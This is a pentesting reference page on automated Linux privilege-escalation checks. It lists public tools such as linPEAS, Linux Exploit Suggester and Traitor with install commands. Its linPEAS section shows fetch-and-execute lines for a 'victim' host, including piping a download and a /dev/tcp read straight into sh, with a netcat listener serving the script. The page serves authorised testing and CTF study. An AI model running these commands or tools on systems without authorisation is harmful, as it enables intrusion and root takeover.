# Automated Checks

[Linux PrivEsc Content](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_-\_linux.html)

[Pentest Monkey - Unix PrivEsc Check](http://pentestmonkey.net/tools/audit/unix-privesc-check)

### Linux Exploit Suggester

{% embed url="https://github.com/mzet-/linux-exploit-suggester" %}

#### **Installation**

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

### Linux Smart Enumeration&#x20;

{% embed url="https://github.com/diego-treitos/linux-smart-enumeration" %}

#### Installation

```bash
wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh

curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh
```

### Linpeas&#x20;

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" %}

#### Installation

```bash
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

#### **Commands**

```bash
# Local network
# On the Host
sudo python -m SimpleHTTPServer 80 

# On the Victim
curl $ip/linpeas.sh | sh 
```

**Without curl**

```bash
# On the Host
sudo nc -q 5 -lvnp 80 < linpeas.sh 

# On the Victim
cat < /dev/tcp/10.10.10.10/80 | sh 
```

### Linux Priv Checker

{% embed url="https://github.com/sleventyeleven/linuxprivchecker" %}

#### Installation&#x20;

```bash
wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py

# python 2.6/2.7
python linuxprivchecker.py -w -o linuxprivchecker.log

# python 3.x
pip install linuxprivchecker

linuxprivchecker -w -o linuxprivchecker.log
# or 
python3 -m linuxprivchecker -w -o linuxprivchecker.log
```

### Traitor

{% embed url="https://github.com/liamg/traitor" %}
⬆️ ☠️ 🔥 Automatic Linux privesc via exploitation of low-hanging fruit e.g. gtfobins, pwnkit, dirty pipe, +w docker.sock
{% endembed %}

### Pspy

{% hint style="info" %}
pspy is a command line tool designed to **snoop** **on processes** without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

The tool gathers the info from procfs scans. Inotify watchers placed on selected parts of the file system trigger these scans to catch short-lived processes.
{% endhint %}

{% embed url="https://github.com/DominicBreuker/pspy" %}
